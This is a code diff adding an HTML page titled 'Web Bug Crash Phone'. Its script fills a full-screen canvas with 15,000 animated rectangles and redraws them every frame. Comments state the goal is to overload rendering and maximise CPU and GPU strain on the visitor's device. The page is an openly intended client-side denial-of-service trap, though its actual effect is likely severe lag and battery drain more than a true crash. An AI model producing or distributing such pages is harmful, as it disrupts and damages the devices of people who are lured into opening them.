@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Web Bug Crash Phone</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; overflow: hidden; height: 100%;
+    background: black;
+  }
+  canvas {
+    display: block; width: 100vw; height: 100vh;
+  }
+</style>
+</head>
+<body>
+<canvas id="crashCanvas"></canvas>
+<script>
+  const canvas = document.getElementById('crashCanvas');
+  const ctx = canvas.getContext('2d');
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+
+  // Create a huge number of elements to overload rendering and processing
+  const maxRects = 15000;
+  let rects = [];
+
+  function randomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  for(let i=0; i<maxRects; i++) {
+    rects.push({
+      x: randomInt(0, canvas.width),
+      y: randomInt(0, canvas.height),
+      w: randomInt(1,10),
+      h: randomInt(1,10),
+      dx: (Math.random()-0.5)*4,
+      dy: (Math.random()-0.5)*4,
+      hue: randomInt(0, 360),
+    });
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for(let i=0; i<rects.length; i++) {
+      let r = rects[i];
+      ctx.fillStyle = `hsl(${r.hue}, 100%, 50%)`;
+      ctx.fillRect(r.x, r.y, r.w, r.h);
+
+      r.x += r.dx; r.y += r.dy;
+      if(r.x < 0 || r.x > canvas.width) r.dx *= -1;
+      if(r.y < 0 || r.y > canvas.height) r.dy *= -1;
+      r.hue += 1;
+      if(r.hue > 360) r.hue = 0;
+    }
+
+    // Intentionally call draw as fast as possible to maximize CPU & GPU strain
+    window.requestAnimationFrame(draw);
+  }
+
+  draw();
+</script>
+</body>
+</html>
+
+```
